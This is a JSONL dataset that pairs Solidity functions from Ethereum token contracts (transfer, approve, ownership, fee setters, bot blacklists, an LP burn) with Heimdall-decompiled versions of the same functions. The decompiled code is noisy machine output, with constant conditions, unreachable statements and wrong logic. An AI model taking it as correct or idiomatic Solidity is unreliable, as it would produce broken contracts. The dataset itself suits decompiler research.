{"contract_address": "0xeF684902f48bf76B9420474Aa213A8e217219674", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x19133850) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x19133850;\n                if (0x09) {\n                    if ((0x01 == 0x01) | !0x19133850) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x19133850;\n                        transferDelayEnabled = uint248(transferDelayEnabled);\n                        if (0x09) {\n                            if ((0x01 == 0x01) | !0x19133850) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x19133850;\n                                emit MaxTxAmountUpdated(0x19133850);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                    if (!0x09 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0x01) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x1727A45a3E3bE7AdF4B185D80F0b4F557b755f87", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_h[var_a];\n        return storage_map_h[var_a];\n    }"}
{"contract_address": "0x33743F9E4bf0A323807Fc1517Bb9aD9557585f48", "original_solidity_code": "function isBot(address a) public view returns (bool){\r\n      return bots[a];\r\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = !(!bytes1(storage_map_b[var_a]));\n        return !(!bytes1(storage_map_b[var_a]));\n    }"}
{"contract_address": "0xa60ecbb555a15D31AaCfd8d44a456A81699e4C9a", "original_solidity_code": "function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (!(store_a) == ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (!(store_a) == ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xDC4259959BFE37685741A162a2D0757cF774E129", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x0571e4201619916DB35214e935F0E46F037BBd2D", "original_solidity_code": "function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {\r\n        liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; developmentFee = _development; totalFee = _total; sellFee = _sell; transferFee = _trans;\r\n        require(totalFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), \"totalFee and sellFee cannot be more than 20%\");\r\n    }", "heimdall_decompiled_code": "function setTransactionRequirements(uint256 arg0, uint256 arg1, uint256 arg2, uint256 arg3, uint256 arg4, uint256 arg5, uint256 arg6) public {\n        require(msg.sender == (address(getOwner)), \"!OWNER\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x06;\n        var_d = 0x214f574e45520000000000000000000000000000000000000000000000000000;\n        store_k = arg0;\n        store_n = arg1;\n        store_j = arg2;\n        store_o = arg3;\n        store_p = arg4;\n        store_q = arg5;\n        store_r = arg6;\n        require(0x01, \"totalFee and sellFee cannot be more than 20%\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require(!(!store_p > (store_i / 0x01)), \"totalFee and sellFee cannot be more than 20%\");\n        require(!(!store_p > (store_i / 0x01)), \"totalFee and sellFee cannot be more than 20%\");\n        require(!(store_p > (store_i / 0x01)), \"totalFee and sellFee cannot be more than 20%\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x2c;\n        var_d = 0x746f74616c46656520616e642073656c6c4665652063616e6e6f74206265206d;\n        var_g = 0x6f7265207468616e203230250000000000000000000000000000000000000000;\n        require(0x01);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require(0x01);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n    }"}
{"contract_address": "0x00E0e40FCbd04bbbF62056e268907E8318b84d67", "original_solidity_code": "function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x26;\n        var_f = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_g = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x94a1FaF408D4F4a74e46973BF75953dB44EcA193", "original_solidity_code": "function manualBurnLiquidityPairTokens(uint256 percent)\r\n        external\r\n        onlyOwner\r\n        returns (bool)\r\n    {\r\n        require(\r\n            block.timestamp > lastManualLpBurnTime + manualBurnFrequency,\r\n            \"Must wait for cooldown to finish\"\r\n        );\r\n        require(percent <= 1000, \"May not nuke more than 10% of tokens in LP\");\r\n        lastManualLpBurnTime = block.timestamp;\r\n\r\n        // get balance of liquidity pair\r\n        uint256 liquidityPairBalance = this.balanceOf(uniswapV2Pair);\r\n\r\n        // calculate amount to burn\r\n        uint256 amountToBurn = liquidityPairBalance.mul(percent).div(10000);\r\n\r\n        // pull tokens from pancakePair liquidity and move to dead address permanently\r\n        if (amountToBurn > 0) {\r\n            super._transfer(uniswapV2Pair, address(0xdead), amountToBurn);\r\n        }\r\n\r\n        //sync price since this is not in a swap transaction!\r\n        IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);\r\n        pair.sync();\r\n        emit ManualNukeLP();\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function manualBurnLiquidityPairTokens(uint256 arg0) public returns (bool) {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(lastManualLpBurnTime > ~(manualBurnFrequency)), \"Must wait for cooldown to finish\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(block.timestamp > (lastManualLpBurnTime + manualBurnFrequency), \"Must wait for cooldown to finish\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4d757374207761697420666f7220636f6f6c646f776e20746f2066696e697368;\n        require(!(arg0 > 0x03e8), \"May not nuke more than 10% of tokens in LP\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x2a;\n        var_d = 0x4d6179206e6f74206e756b65206d6f7265207468616e20313025206f6620746f;\n        var_g = 0x6b656e7320696e204c5000000000000000000000000000000000000000000000;\n        lastManualLpBurnTime = block.timestamp;\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x3598022a221df187dc56927a9a0dc31ca9ab9201;\n        (bool success, bytes memory ret0) = address(this).Unresolved_70a08231(var_b); // staticcall\n        uint256 var_h = var_h + (uint248(ret0.length + 0x1f));\n        require(!(((var_h + ret0.length) - var_h) < 0x20), \"ERC20: transfer from the zero address\");\n        require(!(var_h.length & (arg0 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / var_h.length))), \"ERC20: transfer from the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x2710, \"ERC20: transfer from the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require(!((var_h.length * arg0) / 0x2710), \"ERC20: transfer from the zero address\");\n        require(0x3598022a221df187dc56927a9a0dc31ca9ab9201, \"ERC20: transfer from the zero address\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x20;\n        var_d = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_j = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(0xdead, \"ERC20: transfer to the zero address\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x20;\n        var_d = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_j = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x3598022a221df187dc56927a9a0dc31ca9ab9201;\n        uint256 var_k = 0;\n        require(!(storage_map_t[var_e] < ((var_h.length * arg0) / 0x2710)), \"ERC20: transfer amount exceeds balance\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x20;\n        var_d = 0x26;\n        var_g = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_j = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_e = 0x3598022a221df187dc56927a9a0dc31ca9ab9201;\n        var_k = 0;\n        storage_map_t[var_e] = storage_map_t[var_e] - ((var_h.length * arg0) / 0x2710);\n        var_e = 0xdead;\n        require(!storage_map_t[var_e] > (~((var_h.length * arg0) / 0x2710)));\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        storage_map_t[var_e] = storage_map_t[var_e] + ((var_h.length * arg0) / 0x2710);\n        uint256 var_i = (var_h.length * arg0) / 0x2710;\n        emit Transfer(0x3598022a221df187dc56927a9a0dc31ca9ab9201, 0xdead, (var_h.length * arg0) / 0x2710);\n        var_i = 0xfff6cae900000000000000000000000000000000000000000000000000000000;\n        require(address(0x3598022a221df187dc56927a9a0dc31ca9ab9201).code.length);\n        (bool success, bytes memory ret0) = address(0x3598022a221df187dc56927a9a0dc31ca9ab9201).{ value: var_k ether }sync(var_c); // call\n        emit ManualNukeLP();\n        var_i = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0xF4DEF1F694801EaBF6f4B4b8b0209E617Bb224e8", "original_solidity_code": "function unblockBot(address notbot) public onlyOwner {\r\n        bots[notbot] = false;\r\n    }", "heimdall_decompiled_code": "function unblockBot(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        address var_e = address(arg0);\n        var_f = 0x10;\n        storage_map_c[var_e] = uint248(storage_map_c[var_e]);\n    }"}
{"contract_address": "0x94a1FaF408D4F4a74e46973BF75953dB44EcA193", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_d[var_a];\n        return storage_map_d[var_a];\n    }"}
{"contract_address": "0xaEAD18A6f788fb7460aDA9fDFf4C4Cd6Ba72dDBE", "original_solidity_code": "function addBypassRule(address who, bytes4 functionSig, uint256 id) public onlyOwner {\\n        byPassableFunction[who][functionSig] = true;\\n        if (id != 0) {\\n            byPassableIds[who][id] = true;\\n        }        \\n    }", "heimdall_decompiled_code": "function addBypassRule(address arg0, bytes4 arg1, uint256 arg2) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == (uint32(arg1)));\n        require(!(bytes1(isClaimable / 0x0100)), \"Not owner or able to bypass\");\n        address var_a = msg.sender;\n        var_b = 0x66;\n        var_a = uint32(msg.data[0]);\n        address var_b = keccak256(var_a);\n        require(address(owner) == msg.sender, \"Not owner or able to bypass\");\n        require(bytes1(storage_map_b[var_a]), \"Not owner or able to bypass\");\n        var_a = address(arg0);\n        var_b = 0x66;\n        var_a = uint32(arg1);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = 0x01 | (uint248(storage_map_b[var_a]));\n        require(!arg2, \"Not owner or able to bypass\");\n        var_a = address(arg0);\n        var_b = 0x67;\n        var_a = arg2;\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = 0x01 | (uint248(storage_map_b[var_a]));\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x1b;\n        var_f = 0x4e6f74206f776e6572206f722061626c6520746f206279706173730000000000;\n        require(address(owner) == msg.sender, \"Not owner or able to bypass\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x1b;\n        var_f = 0x4e6f74206f776e6572206f722061626c6520746f206279706173730000000000;\n        require(address(owner) == msg.sender, \"Not owner or able to bypass\");\n        require(address(owner) == msg.sender, \"Not owner or able to bypass\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x1b;\n        var_f = 0x4e6f74206f776e6572206f722061626c6520746f206279706173730000000000;\n        var_a = address(arg0);\n        var_b = 0x66;\n        var_a = uint32(arg1);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = 0x01 | (uint248(storage_map_b[var_a]));\n        require(!arg2);\n        var_a = address(arg0);\n        var_b = 0x67;\n        var_a = arg2;\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = 0x01 | (uint248(storage_map_b[var_a]));\n    }"}
{"contract_address": "0x332098414098f0E42658f2eA0254B44b077bb4A5", "original_solidity_code": "function OceanBreezeWave(address spender, uint256 sumValue) public virtual returns (bool) {\\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + sumValue);\\n        return true;\\n    }", "heimdall_decompiled_code": "function OceanBreezeWave(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + arg1)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_d = storage_map_b[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x22;\n        var_h = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_i = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x24;\n        var_h = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_i = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x9BF903014c2dbD36f8818eBfc7D840B2cDB6A25b", "original_solidity_code": "function enableTrading(uint256 _deadBlocks) external onlyOwner {\r\n        require(!tradingActive, \"Token launched\");\r\n        tradingActive = true;\r\n        launchBlock = block.number;\r\n        swapEnabled = true;\r\n        deadBlocks = _deadBlocks;\r\n    }", "heimdall_decompiled_code": "function enableTrading(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(tradingActive / 0x0100)), \"Token launched\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x0e;\n        var_d = 0x546f6b656e206c61756e63686564000000000000000000000000000000000000;\n        store_l = block.number;\n        tradingActive = 0x010100 | (uint240(tradingActive));\n        store_m = arg0;\n    }"}
{"contract_address": "0x6C582560fE845680fA8fFC628a9Ae666008111f4", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x5Bfdf57678baFB4eBB2c09279ac382397F3006b6", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\nrequire(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\nemit OwnershipTransferred(_owner, newOwner);\r\n_owner = newOwner;\r\n}", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(address(owner), address(arg0));\n        owner = (address(arg0)) | (uint96(owner));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x68166ad94798eafB675d6Ff4Cd28eE6eAA19bd17", "original_solidity_code": "function approve(address spender, uint256 amount) external returns (bool){\r\n        allowance[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0xD077813f2e3C8a461d6a0c07F093257856319cA8", "original_solidity_code": "function name() external view override returns (string memory) {\\r\\n      return _name;\\r\\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        bytes1 var_a = 0x20 + (var_a + (0x20 * (((store_a & (((!bytes1(store_a)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) + 0x1f) / 0x20)));\n        bytes1 var_b = (store_a & (((!bytes1(store_a)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02;\n        if (!(store_a & (((!store_a) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02) {\n            if (0x1f < (store_a & (((!store_a) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02)) {\n                uint256 var_c = 0;\n                uint256 var_d = storage_map_b[var_c];\n                if ((var_a + 0x20) + (store_a & (((!store_a) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) > (0x20 + (var_a + 0x20))) {\n                    var_d = 0x20;\n                    bytes1 var_e = var_a.length;\n                    if (!var_a.length) {\n                        bytes1 var_f = (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g);\n                        return abi.encodePacked(0x20, var_a.length, (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g));\n                        return abi.encodePacked(0x20, var_a.length);\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xf14bcFb9213C0583632d65e80ac5B2Bd02c7D3d8", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public payable {\n        require(address(owner) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0x094f17A0D2C12d8AB36a5a27d14DbC47B9cFdC30", "original_solidity_code": "function transfer(address to, uint256 amount) external returns (bool){\r\n        return _transfer(msg.sender, to, amount);\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        require(!(storage_map_b[var_a] - arg1) > storage_map_b[var_a]);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        require(!(address(store_a)) == (address(arg0)));\n        require(!(address(store_a)) == (address(arg0)));\n        require(!(address(store_a)) == (address(arg0)));\n        require(address(this) == (address(msg.sender)));\n        require(address(store_a) == (address(msg.sender)));\n        require((store_c == ((store_c * arg1) / arg1)) | !arg1);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(0x64);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_a = address(arg0);\n        var_b = 0x02;\n        require(!storage_map_b[var_a] > (arg1 + storage_map_b[var_a]));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_d = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_d = 0x01;\n        return 0x01;\n        store_a = 0x010000000000000000000000000000000000000000 | (uint248(store_a));\n        var_d = 0x02;\n        uint256 var_e = var_e + 0x60;\n        var_f = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_g = address(this);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        var_h = 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2;\n        require(0x12);\n        require((0x01 == 0x01) | !0x0f4240);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(0x64);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_i = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        var_j = 0x2710;\n        uint256 var_k = 0;\n        var_l = 0xa0;\n        uint256 var_m = var_e.length;\n        address var_n = address(this);\n        uint256 var_o = block.timestamp;\n        require(address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).code.length);\n        (bool success, bytes memory ret0) = address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).{ value: var_k ether }Unresolved_791ac947(var_j); // call\n        (bool success, bytes memory ret0) = address(0x9cb6da40d96aa44cc0314df6814033c3513e75a6).transfer(address(this).balance);\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                require(0x0a);\n                require(0x0a == 0x01);\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_c = 0x11;\n                require(0x0a == 0x02);\n                require(!0x12 > 0xff);\n                require(!((0x0a < 0x0b) & (0x12 < 0x4e)) | ((0x0a < 0x0133) & (0x12 < 0x20)));\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_c = 0x11;\n                require(!0x12 > 0x01);\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_c = 0x11;\n                require(!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999);\n            }\n            require(!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999);\n        }\n    }"}
{"contract_address": "0xFF5C43C4fADdF9A03BEdE1D0b276E7eC996504a1", "original_solidity_code": "function manualsend() external {\r\n        require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress);\r\n        uint256 contractETHBalance = address(this).balance;\r\n        sendETHToFee(contractETHBalance);\r\n    }", "heimdall_decompiled_code": "function manualsend() public {\n        require(address(msg.sender) == (address(store_p)));\n        require(address(msg.sender) == (address(store_q)));\n        (bool success, bytes memory ret0) = address(store_q).transfer(address(this).balance);\n    }"}
